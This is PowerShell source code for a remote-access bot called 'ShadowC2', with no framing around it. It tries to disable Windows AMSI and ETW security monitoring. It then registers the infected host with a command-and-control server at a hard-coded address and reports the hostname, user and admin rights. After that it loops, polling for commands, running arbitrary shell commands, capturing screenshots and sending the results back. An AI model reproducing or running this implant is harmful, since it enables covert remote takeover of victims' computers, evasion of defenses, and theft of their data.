# ShadowC2 Bot - PowerShell (para Windows sin Python)
$C2_IP = "192.168.1.6"
$C2_PORT = "8000"
$BOT_ID = -join ((48..57) + (97..102) | Get-Random -Count 12 | ForEach-Object {[char]$_})

# AMSI BYPASS
try {
    $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
    $b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
    $c = $b.GetValue($null)
    [IntPtr]$ptr = $c
    [Int32[]]$buf = @(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
} catch {}

# ETW BYPASS
try {
    $dll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
    [System.Runtime.InteropServices.Marshal]::WriteInt32($dll.BaseAddress + 0x1000, 0)
} catch {}

function Register-Bot {
    $body = @{
        bot_id = $BOT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
        privileges = if ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') { "admin" } else { "user" }
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    } catch { return $false }
}

function Check-Commands {
    try {
        $resp = Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/check/$BOT_ID" -Method GET
        return $resp.commands
    } catch { return @() }
}

function Send-Result($cmdId, $result) {
    $body = @{ cmd_id = $cmdId; result = $result } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/result/$BOT_ID" -Method POST -Body $body -ContentType "application/json"
    } catch {}
}

function Execute-Shell($cmd) {
    try { $output = Invoke-Expression $cmd 2>&1 | Out-String; return $output } 
    catch { return $_.Exception.Message }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        return [Convert]::ToBase64String($ms.ToArray())
    } catch { return "Error: $_" }
}

# MAIN LOOP
if (Register-Bot) {
    while ($true) {
        $commands = Check-Commands
        foreach ($cmd in $commands) {
            $result = switch ($cmd.command) {
                "shell" { Execute-Shell ($cmd.args) }
                "screenshot" { Take-Screenshot }
                "info" { @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os=(Get-CimInstance Win32_OperatingSystem).Caption} | ConvertTo-Json }
                "kill" { exit }
                default { "Unknown: $($cmd.command)" }
            }
            Send-Result $cmd.id $result
        }
        Start-Sleep -Seconds 10
    }
}
